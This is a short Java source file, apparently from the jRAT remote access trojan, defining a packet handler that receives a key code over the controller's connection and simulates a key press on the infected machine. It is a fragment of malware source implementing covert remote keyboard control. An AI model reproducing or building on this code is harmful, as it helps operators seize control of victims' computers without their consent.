package jrat.client.packets.incoming;

import jrat.common.utils.Utils;
import jrat.client.Connection;
import jrat.client.utils.ScreenUtils;

public class Packet94KeyPress extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		int btn = con.readInt();

		if (!Utils.isHeadless()) {
			ScreenUtils.getDefault().keyPress(btn);
		}
	}

}
